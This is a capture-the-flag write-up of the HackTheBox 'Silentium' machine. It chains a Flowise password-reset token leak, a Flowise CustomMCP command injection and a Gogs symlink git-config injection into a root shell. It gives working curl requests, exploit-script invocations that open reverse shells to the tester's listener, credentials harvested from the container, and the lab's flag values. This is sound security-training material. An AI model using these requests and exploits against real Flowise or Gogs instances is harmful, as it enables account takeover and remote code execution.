---
layout: default
title: "HTB – Silentium | Costabo1"
description: "HackTheBox writeup for the Silentium machine by Costabo1"
---

<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap');

:root {
  --bg:      #080c0a;
  --surface: #0d1410;
  --border:  #172419;
  --accent:  #1a775d;
  --accent2: #22a078;
  --accent3: #1a775d;
  --muted:   #4d7060;
  --text:    #b8ccc2;
  --heading: #e0ede6;
  --mono:    'Share Tech Mono', monospace;
  --sans:    'Syne', sans-serif;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

body, .markdown-body, header, section, footer,
.page-header, .main-content, .project-name,
.project-tagline, .project-date, nav {
  all: revert;
  box-sizing: border-box;
}

body {
  background: var(--bg) !important;
  color: var(--text) !important;
  font-family: var(--sans) !important;
  font-size: 18px !important;
  line-height: 1.9 !important;
  margin: 0 !important;
  padding: 0 !important;
}

/* Kill the modernist theme header and nav */
.page-header, header[role="banner"], nav, .site-nav,
.main-content h1:first-child, .project-name, .project-tagline {
  display: none !important;
}

.main-content {
  max-width: 100% !important;
  padding: 0 !important;
  margin: 0 !important;
  font-size: 18px !important;
  color: var(--text) !important;
}

/* ── Hero ── */
.htb-hero {
  border-bottom: 1px solid var(--border);
  padding: 3.5rem 1.5rem 2.5rem;
  background: linear-gradient(135deg, #080c0a 55%, #091a12 100%);
  position: relative;
  overflow: hidden;
}
.htb-hero::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(26,119,93,.035) 40px);
  pointer-events: none;
}
.htb-hero .inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; }

.badge-row { display: flex; flex-wrap: wrap; gap: .4rem; margin-bottom: 1.1rem; }
.badge {
  font-family: var(--mono);
  font-size: .72rem;
  padding: .22rem .65rem;
  border-radius: 3px;
  border: 1px solid;
  letter-spacing: .06em;
  text-transform: uppercase;
}
.badge-easy  { color: #1a775d; border-color: #1a775d; background: rgba(26,119,93,.1); }
.badge-linux { color: #1a775d; border-color: #1a775d; background: rgba(26,119,93,.07); }
.badge-retired { color: var(--muted); border-color: var(--muted); background: rgba(77,112,96,.07); }

.htb-hero h1 {
  font-family: var(--sans) !important;
  font-weight: 800 !important;
  font-size: clamp(1.8rem, 6vw, 3rem) !important;
  color: var(--heading) !important;
  margin: 0 0 .5rem !important;
  letter-spacing: -.02em !important;
  line-height: 1.15 !important;
  border: none !important;
  padding: 0 !important;
}
.htb-hero h1 span { color: #1a775d; }
.htb-hero .subtitle { font-family: var(--mono); color: var(--muted); font-size: .82rem; margin: 0; }

/* ── Layout ── */
.content-wrap { max-width: 860px; margin: 0 auto; padding: 0 1.5rem 5rem; }

/* ── Info grid ── */
.info-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
  gap: 1px;
  background: var(--border);
  border: 1px solid var(--border);
  border-radius: 6px;
  overflow: hidden;
  margin: 2.5rem 0;
  font-family: var(--mono);
  font-size: .82rem;
}
.info-grid .cell { background: var(--surface); padding: .9rem 1rem; }
.info-grid .cell .lbl { color: var(--muted); font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; margin-bottom: .25rem; }
.info-grid .cell .val { color: var(--heading); }

/* ── Section headings ── */
.section-heading {
  font-family: var(--sans) !important;
  font-weight: 700 !important;
  font-size: 1.25rem !important;
  color: var(--heading) !important;
  margin: 3.75rem 0 1.4rem !important;
  padding-bottom: .55rem !important;
  border-bottom: 1px solid var(--border) !important;
  border-top: none !important;
  border-left: none !important;
  border-right: none !important;
  background: none !important;
}
.sub-heading {
  font-family: var(--mono);
  font-weight: 700;
  color: #1a775d;
  font-size: .9rem;
  margin: 2.5rem 0 .85rem;
  letter-spacing: .05em;
  text-transform: uppercase;
}

/* ── Prose ── */
.prose p { margin: 0 0 1.25rem; line-height: 1.9; color: var(--text); }
.prose strong { color: var(--heading); }
.prose a { color: var(--accent2); text-decoration: none; }
.prose a:hover { text-decoration: underline; }
.prose code {
  background: rgba(26,119,93,.1);
  color: #22a078;
  padding: .1em .45em;
  border-radius: 3px;
  font-family: var(--mono);
  font-size: .85em;
  word-break: break-word;
}
.prose ul { padding-left: 1.4rem; margin: .25rem 0 1.75rem; list-style: disc; }
.prose ul li { margin-bottom: .65rem; line-height: 1.8; color: var(--text); }
.prose ul li strong { color: var(--heading); }

/* ── Code blocks ── */
.codeblock {
  background: #050907;
  border: 1px solid var(--border);
  border-left: 3px solid #1a775d;
  border-radius: 4px;
  padding: 1.1rem 1.25rem;
  overflow-x: auto;
  font-family: var(--mono);
  font-size: .82rem;
  color: #5debb5;
  margin: .5rem 0 2rem;
  line-height: 1.65;
  white-space: pre;
}
.codeblock.output {
  border-left-color: var(--border);
  color: var(--text);
}

/* ── Callouts ── */
.callout {
  border: 1px solid;
  border-radius: 5px;
  padding: 1.1rem 1.15rem;
  margin: 1.75rem 0 2.25rem;
  font-size: .93rem;
  display: flex;
  gap: .8rem;
  align-items: flex-start;
  line-height: 1.75;
}
.ci { flex-shrink: 0; font-size: 1.05rem; line-height: 1.75; }
.cb { flex: 1; }
.cb strong { display: block; margin-bottom: .3rem; font-size: .72rem; text-transform: uppercase; letter-spacing: .09em; }
.callout.info   { border-color: rgba(26,119,93,.35);  background: rgba(26,119,93,.06);  color: #93d5b8; }
.callout.danger { border-color: rgba(255,75,75,.3);   background: rgba(255,75,75,.05);  color: #fca5a5; }
.callout.win    { border-color: rgba(26,119,93,.4);   background: rgba(26,119,93,.08);  color: #5debb5; }

/* ── Tool pills ── */
.tool-list { display: flex; flex-wrap: wrap; gap: .45rem; margin: .75rem 0 2.25rem; padding: 0; list-style: none; }
.tool-list li {
  font-family: var(--mono);
  font-size: .75rem;
  padding: .28rem .7rem;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 3px;
  color: #22a078;
  letter-spacing: .04em;
}

/* ── Diff bar ── */
.diff-bar { margin: .25rem 0 2.25rem; }
.diff-bar .track { height: 4px; background: var(--border); border-radius: 99px; width: min(200px, 55%); }
.diff-bar .fill { height: 100%; border-radius: 99px; background: linear-gradient(90deg, #1a775d, #22a078); }
.diff-bar .lbl { font-family: var(--mono); font-size: .7rem; color: var(--muted); margin-top: .35rem; }

/* ── Attack chain ── */
.chain { margin: 1.5rem 0 2.5rem; }
.chain-item { margin-bottom: 4px; }
.chain-node { background: var(--surface); border: 1px solid var(--border); border-radius: 5px; padding: .75rem 1.1rem; color: var(--text); font-size: .92rem; line-height: 1.6; }
.chain-node .tag { font-family: var(--mono); font-size: .65rem; color: #1a775d; text-transform: uppercase; letter-spacing: .1em; margin-bottom: .25rem; }
.chain-node code { background: rgba(26,119,93,.1); color: #22a078; padding: .1em .4em; border-radius: 3px; font-family: var(--mono); font-size: .85em; }
.chain-connector { width: 1px; height: 18px; background: rgba(26,119,93,.25); margin-left: 5px; }

/* ── Cred table ── */
.cred-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: .82rem; margin: .75rem 0 2.25rem; display: block; overflow-x: auto; }
.cred-table th { background: var(--surface); color: var(--muted); font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; padding: .6rem 1rem; text-align: left; border: 1px solid var(--border); white-space: nowrap; }
.cred-table td { border: 1px solid var(--border); padding: .6rem 1rem; color: var(--text); word-break: break-all; }
.cred-table tr:hover td { background: rgba(255,255,255,.02); }

/* ── Flag block ── */
.flag-block { display: flex; align-items: center; flex-wrap: wrap; gap: .85rem; background: rgba(26,119,93,.05); border: 1px solid rgba(26,119,93,.2); border-radius: 6px; padding: 1.1rem 1.25rem; margin: 1.25rem 0 2.5rem; font-family: var(--mono); }
.flag-block .fi { font-size: 1.35rem; flex-shrink: 0; }
.flag-block .fl { font-size: .65rem; color: var(--muted); text-transform: uppercase; letter-spacing: .1em; white-space: nowrap; }
.flag-block .fv { color: #22a078; font-size: .85rem; word-break: break-all; flex: 1; min-width: 0; }

/* ── Divider ── */
.divider { border: none !important; border-top: 1px solid var(--border) !important; margin: 3.25rem 0 !important; background: none !important; height: 0 !important; }

/* ── Footer ── */
.writeup-footer { border-top: 1px solid var(--border); padding: 1.5rem; font-family: var(--mono); font-size: .75rem; color: var(--muted); text-align: center; margin-top: 2rem; }
.writeup-footer span { color: #1a775d; }

/* ── Zoomable images ── */
.zoomable { cursor: zoom-in; transition: opacity .2s; display: block; max-width: 100%; border-radius: 6px; border: 1px solid var(--border); margin: 1rem 0 2rem; }
.zoomable:hover { opacity: .85; }

/* ── Mobile ── */
@media (max-width: 600px) {
  body { font-size: 15px !important; }
  .htb-hero { padding: 2.25rem 1.1rem 1.75rem; }
  .content-wrap { padding: 0 1.1rem 3.5rem; }
  .info-grid { grid-template-columns: repeat(2, 1fr); font-size: .78rem; }
  .section-heading { font-size: 1.1rem !important; margin-top: 3rem !important; }
  .sub-heading { font-size: .85rem; margin-top: 2rem; }
  .codeblock { font-size: .74rem; padding: .9rem; margin-bottom: 1.5rem; }
  .cred-table { font-size: .73rem; }
  .callout { font-size: .88rem; padding: .9rem; }
  .chain-node { font-size: .84rem; }
  .prose p { margin-bottom: 1rem; }
}
</style>

<script>
document.addEventListener('DOMContentLoaded', function () {
  document.querySelectorAll('.zoomable').forEach(function (img) {
    img.addEventListener('click', function () {
      var box = document.getElementById(this.getAttribute('data-target'));
      if (box) box.style.display = 'flex';
    });
  });
  document.querySelectorAll('.lightbox-close').forEach(function (btn) {
    btn.addEventListener('click', function () {
      this.closest('div').style.display = 'none';
    });
  });
  document.querySelectorAll('[id^="zoom-"]').forEach(function (box) {
    box.addEventListener('click', function (e) {
      if (e.target === this) this.style.display = 'none';
    });
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      document.querySelectorAll('[id^="zoom-"]').forEach(function (b) { b.style.display = 'none'; });
    }
  });
});
</script>

<!-- HERO -->
<div class="htb-hero">
  <div class="inner">
    <div class="badge-row">
      <span class="badge badge-easy">Easy</span>
      <span class="badge badge-linux">Linux</span>
      <span class="badge badge-retired">Retired</span>
    </div>
    <h1>👾 HackTheBox — <span>Silentium</span></h1>
    <p class="subtitle">costabo1 &nbsp;·&nbsp; writeup &nbsp;·&nbsp; 2025</p>
  </div>
</div>

<div class="content-wrap">

  <!-- Info grid -->
  <div class="info-grid">
    <div class="cell"><div class="lbl">OS</div><div class="val">Linux</div></div>
    <div class="cell"><div class="lbl">Difficulty</div><div class="val">Easy</div></div>
    <div class="cell"><div class="lbl">Points</div><div class="val">20</div></div>
    <div class="cell"><div class="lbl">CVEs</div><div class="val">2025-58434 · 2025-59528 · 2025-8110</div></div>
    <div class="cell"><div class="lbl">Status</div><div class="val">Retired</div></div>
    <div class="cell"><div class="lbl">Author</div><div class="val">Costabo1</div></div>
  </div>

  <hr class="divider">

  <!-- OVERVIEW -->
  <h2 class="section-heading">🔭 Overview</h2>
  <div class="prose">
    <p>Silentium is an easy-difficulty Linux machine built around a realistic three-CVE attack chain targeting modern AI tooling and a self-hosted git service.</p>
    <p>The path starts with subdomain enumeration revealing a Flowise AI instance running version 3.0.5. An unauthenticated password reset token leak allows account takeover of a valid user, which unlocks a CustomMCP injection vulnerability for remote code execution inside a Docker container. Credential reuse discovered in the container environment variables pivots us to SSH as <code>ben</code> on the host. From there, a locally bound Gogs git service running as root is exposed via port forwarding and exploited through a symlink git config injection to achieve full system compromise.</p>
    <p><strong>Attack chain at a glance:</strong></p>
  </div>

  <div class="chain">
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 1 — Recon</div>Nmap finds ports 22 and 80 → <code>silentium.htb</code> → manual browsing identifies <code>Ben</code> as a likely system user</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 2 — Subdomain Discovery</div>ffuf reveals <code>staging.silentium.htb</code> running <strong>Flowise AI 3.0.5</strong></div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 3 — CVE-2025-58434</div>Unauthenticated password reset token leak → <code>tempToken</code> in API response → reset <code>ben@silentium.htb</code></div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 4 — CVE-2025-59528</div>Authenticated CustomMCP node injection → reverse shell inside Docker container</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 5 — Lateral Movement</div>Docker env leak → <code>SMTP_PASSWORD</code> reused as SSH password → shell on host → <code>user.txt</code></div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 6 — CVE-2025-8110</div>SSH port forward → Gogs 0.13.0 symlink git config injection → root shell → <code>root.txt</code></div>
    </div>
  </div>

  <div class="diff-bar">
    <div class="track"><div class="fill" style="width:30%"></div></div>
    <div class="lbl">Difficulty feel: Easy</div>
  </div>

  <!-- TOOLS -->
  <h2 class="section-heading">🛠️ Tools Used</h2>
  <ul class="tool-list">
    <li>nmap</li><li>ffuf</li><li>curl</li><li>burpsuite</li>
    <li>python3</li><li>ssh</li><li>netcat</li><li>git</li>
    <li>flowise_chain.py</li><li>Silentgogs.py</li>
  </ul>

  <hr class="divider">

  <!-- ENUMERATION -->
  <h2 class="section-heading">🔍 Enumeration</h2>

  <h3 class="sub-heading">Port Scan</h3>
  <div class="prose">
    <p>Start with a full service and version scan to map the attack surface:</p>
  </div>
  <div class="codeblock">nmap -sC -sV -oN silentium.nmap 10.129.36.184</div>
  <div class="codeblock output">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/</div>
  <div class="prose">
    <p>Only two ports open — SSH and HTTP. Add the hostname to your hosts file:</p>
  </div>
  <div class="codeblock">echo "10.129.36.184  silentium.htb" | sudo tee -a /etc/hosts</div>

  <h3 class="sub-heading">Web Enumeration & User Discovery</h3>
  <div class="prose">
    <p>Manual browsing of <code>silentium.htb</code> reveals staff profiles. <strong>Ben</strong>, listed as Head of Financial Systems, is the only person without a last name — strongly suggesting he is a local system user. His email <code>ben@silentium.htb</code> becomes our primary target.</p>
  </div>

  <h3 class="sub-heading">Subdomain Fuzzing</h3>
  <div class="codeblock">ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0</div>
  <div class="codeblock output">staging    [Status: 200, Size: 4823]</div>
  <div class="codeblock">echo "10.129.36.184  staging.silentium.htb" | sudo tee -a /etc/hosts</div>

  <div class="callout info">
    <span class="ci">ℹ️</span>
    <div class="cb">
      <strong>Key Finding</strong>
      <code>http://staging.silentium.htb/</code> reveals a <strong>Flowise AI 3.0.5</strong> instance. This version is vulnerable to two chained CVEs allowing unauthenticated account takeover and remote code execution.
    </div>
  </div>

  <h3 class="sub-heading">User Validation</h3>
  <div class="prose">
    <p>Flowise's login endpoint leaks user existence via different HTTP status codes — 404 for nonexistent users, 401 for wrong password on valid accounts:</p>
  </div>
  <div class="codeblock"># Non-existent — returns 404
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@silentium.htb","password":"test"}'

# Valid user — returns 401
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"test"}'</div>
  <div class="prose">
    <p><code>ben@silentium.htb</code> confirmed as a valid account. Time to take it over.</p>
  </div>

  <hr class="divider">

  <!-- INITIAL FOOTHOLD -->
  <h2 class="section-heading">⚡ Initial Foothold</h2>

  <h3 class="sub-heading">Step 1 — Password Reset Token Leak (CVE-2025-58434)</h3>
  <div class="prose">
    <p><strong>CVE-2025-58434</strong> affects Flowise versions prior to 3.0.6. When a forgot-password request is sent, the server returns the <code>tempToken</code> directly in the API response body — no email delivery required. Any unauthenticated attacker who knows a valid email can reset that account's password.</p>
  </div>
  <div class="codeblock">curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'</div>
  <div class="codeblock output">{"tempToken":"kQCALoC76CC8TWotbu0liSHZqUH3wLVXGI2vjlt5S2JClscEpdiO65eCVZk3eLRI"}</div>

  <h3 class="sub-heading">Step 2 — Account Takeover</h3>
  <div class="codeblock">TOKEN="kQCALoC76CC8TWotbu0liSHZqUH3wLVXGI2vjlt5S2JClscEpdiO65eCVZk3eLRI"

# Verify token
curl -s -X POST http://staging.silentium.htb/api/v1/account/verify \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d "{\"user\": {\"tempToken\": \"$TOKEN\"}}"

# Reset password
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d "{\"token\": \"$TOKEN\", \"password\": \"uppp123!\"}"</div>
  <div class="prose">
    <p>Rather than manually hunting the MCP injection point in the dashboard, we chain both CVEs with a public exploit script:</p>
  </div>
  <div class="codeblock">python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb</div>
  <div class="codeblock output">[*] Version:     3.0.5
[+] Version 3.0.5 is vulnerable.
[+] Got tempToken for user 'admin'
[+] Password reset successful. Password: Pwn3d!2026</div>

  <div class="callout info">
    <span class="ci">ℹ️</span>
    <div class="cb">
      <strong>Manual Step Required</strong>
      Due to a Flowise 3.0.5 quirk, the API login endpoint doesn't immediately accept the reset password. Log into the UI at <code>http://staging.silentium.htb/login</code>, navigate to Settings → API Keys, and paste the key back into the script prompt.
    </div>
  </div>

  <h3 class="sub-heading">Step 3 — CustomMCP RCE (CVE-2025-59528)</h3>
  <div class="prose">
    <p><strong>CVE-2025-59528</strong> allows an authenticated Flowise user to inject arbitrary commands via the CustomMCP node's server configuration JSON. The platform executes these without sanitization, yielding code execution inside the container.</p>
  </div>
  <div class="codeblock">nc -lvnp 4444</div>
  <div class="codeblock output">[+] TIMEOUT — reverse shell may have connected

connect to [10.10.15.144] from (UNKNOWN) [10.129.36.184] 49170
# whoami
root
# hostname
c78c3cceb7ba</div>
  <div class="prose">
    <p>We're root inside the Docker container. The hostname confirms a containerized environment.</p>
  </div>

  <h3 class="sub-heading">Step 4 — Credential Harvest from Docker Environment</h3>
  <div class="codeblock">env</div>
  <div class="codeblock output">FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
...</div>

  <div class="callout danger">
    <span class="ci">🔴</span>
    <div class="cb">
      <strong>Credential Reuse — Human Error</strong>
      The <code>SMTP_PASSWORD</code> value <code>r04D!!_R4ge</code> was reused as Ben's SSH password on the host machine — bridging the container boundary entirely.
    </div>
  </div>

  <h3 class="sub-heading">Step 5 — SSH as Ben → User Flag</h3>
  <div class="codeblock">ssh ben@10.129.36.184
# Password: r04D!!_R4ge</div>
  <div class="codeblock output">ben@silentium:~$</div>
  <div class="codeblock">cat /home/ben/user.txt</div>
  <div class="flag-block">
    <span class="fi">🏴</span>
    <span class="fl">user.txt</span>
    <span class="fv">ca2580193b0607f5119480c830ec3515</span>
  </div>

  <hr class="divider">

  <!-- PRIVESC -->
  <h2 class="section-heading">📈 Privilege Escalation</h2>

  <h3 class="sub-heading">Local Service Discovery</h3>
  <div class="codeblock">ss -tlnp</div>
  <div class="codeblock output">LISTEN   0   4096   127.0.0.1:3001   ← Gogs git service</div>
  <div class="codeblock">cat /opt/gogs/gogs/custom/conf/app.ini</div>
  <div class="codeblock output">[server]
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3001
DOMAIN    = staging-v2-code.dev.silentium.htb
RUN_USER  = root</div>

  <div class="callout danger">
    <span class="ci">🔴</span>
    <div class="cb">
      <strong>Critical Finding</strong>
      Gogs is configured with <code>RUN_USER = root</code> — any code execution via Gogs runs with full root privileges on the host.
    </div>
  </div>

  <h3 class="sub-heading">Port Forwarding</h3>
  <div class="codeblock">ssh -L 3001:127.0.0.1:3001 ben@10.129.36.184</div>
  <div class="codeblock">echo "127.0.0.1  staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts</div>
  <div class="prose">
    <p>Register an account at <code>http://localhost:3001/user/sign_up</code> then generate an API token under Settings → Applications.</p>
  </div>

  <table class="cred-table">
    <tr><th>Field</th><th>Value</th></tr>
    <tr><td>Username</td><td>hacber12</td></tr>
    <tr><td>Password</td><td>dsadsa</td></tr>
    <tr><td>API Token</td><td>ad245e44ed05e7d906011b59f622f69599be3ac0</td></tr>
  </table>

  <h3 class="sub-heading">Gogs Symlink Git Config Injection (CVE-2025-8110)</h3>
  <div class="prose">
    <p><strong>CVE-2025-8110</strong> affects Gogs 0.13.0. The exploit pushes a repository containing a symlink pointing to <code>.git/config</code>, retrieves the file SHA via the API, then overwrites the content with a malicious git config containing an <code>sshCommand</code> reverse shell. When Gogs performs any SSH git operation it executes the injected command as root.</p>
  </div>
  <div class="codeblock">nc -lvnp 9001</div>
  <div class="codeblock">python3 Silentgogs.py \
  -u http://localhost:3001 \
  -lh 10.10.15.144 \
  -lp 9001 \
  --username hacber12 \
  --password dsadsa \
  --token ad245e44ed05e7d906011b59f622f69599be3ac0</div>
  <div class="codeblock output">[+] Authenticated successfully
[+] Application token: ad245e44ed05e7d906011b59f622f69599be3ac0
    Repo creation status: 201
[+] Symlink pushed
[+] Exploit sent, check your listener!

connect to [10.10.15.144] from (UNKNOWN) [10.129.245.103] 49170
root@silentium:~# cat root.txt</div>

  <div class="callout win">
    <span class="ci">✅</span>
    <div class="cb">
      <strong>Root Obtained</strong>
      The injected <code>sshCommand</code> in <code>.git/config</code> executed when Gogs triggered an SSH operation, spawning a root shell. Full system compromise achieved.
    </div>
  </div>

  <h3 class="sub-heading">🏁 Root Flag</h3>
  <div class="codeblock">cat /root/root.txt</div>
  <div class="flag-block">
    <span class="fi">🏁</span>
    <span class="fl">root.txt</span>
    <span class="fv">9eaa1f1c15d98ae29c0a868107068b0f</span>
  </div>

  <hr class="divider">

  <!-- CVE SUMMARY -->
  <h2 class="section-heading">🔬 CVE Summary</h2>
  <table class="cred-table">
    <tr><th>CVE</th><th>Component</th><th>Impact</th><th>Used For</th></tr>
    <tr><td>CVE-2025-58434</td><td>Flowise &lt;= 3.0.5</td><td>Unauthenticated password reset token leak in API response</td><td>Account takeover of ben@silentium.htb</td></tr>
    <tr><td>CVE-2025-59528</td><td>Flowise &lt;= 3.0.5</td><td>Authenticated CustomMCP node command injection</td><td>Reverse shell inside Docker container</td></tr>
    <tr><td>CVE-2025-8110</td><td>Gogs 0.13.0</td><td>Symlink git config injection → RCE as git service user</td><td>Root shell via sshCommand injection</td></tr>
  </table>

  <hr class="divider">

  <!-- KEY TAKEAWAYS -->
  <h2 class="section-heading">📝 Key Takeaways</h2>
  <div class="prose">
    <ul style="color: var(--text);">
      <li style="color: var(--text);"><strong>Never expose password reset tokens in API responses.</strong> The <code>tempToken</code> should only be delivered out-of-band via email. Returning it in the response body completely bypasses email verification.</li>
      <li style="color: var(--text);"><strong>LLM tooling platforms are a growing attack surface.</strong> Flowise, LangChain, and similar platforms often execute arbitrary subprocess commands by design — if authentication is bypassed, RCE is trivial.</li>
      <li style="color: var(--text);"><strong>Docker containers are not security boundaries for credentials.</strong> Environment variables are readable by any process inside the container. Use a dedicated secrets manager, never hardcode secrets in compose files.</li>
      <li style="color: var(--text);"><strong>Credential reuse across services is always critical.</strong> The SMTP password reused as SSH password bridged the container-to-host boundary entirely. Every service should use unique, rotated credentials.</li>
      <li style="color: var(--text);"><strong>Internal services running as root are high-value targets.</strong> Gogs with <code>RUN_USER = root</code> meant any git-triggered code execution was an immediate full system compromise. Services should always run as dedicated low-privilege users.</li>
      <li style="color: var(--text);"><strong>Port forwarding is a powerful pivot technique.</strong> Internal services not exposed externally can still be reached from a compromised account. Always enumerate with <code>ss -tlnp</code> after gaining a foothold.</li>
    </ul>
  </div>

  <hr class="divider">

  <!-- REFERENCES -->
  <h2 class="section-heading">🔗 References</h2>
  <div class="prose">
    <ul>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58434">NVD — CVE-2025-58434 (Flowise ATO)</a></li>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59528">NVD — CVE-2025-59528 (Flowise CustomMCP RCE)</a></li>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-8110">NVD — CVE-2025-8110 (Gogs Symlink RCE)</a></li>
      <li><a href="https://github.com/FlowiseAI/Flowise">Flowise AI on GitHub</a></li>
      <li><a href="https://github.com/gogs/gogs">Gogs on GitHub</a></li>
    </ul>
  </div>

</div>

<div class="writeup-footer">
  <span>costabo1</span> &nbsp;·&nbsp; HackTheBox Writeup &nbsp;·&nbsp; All content for educational purposes only
</div>
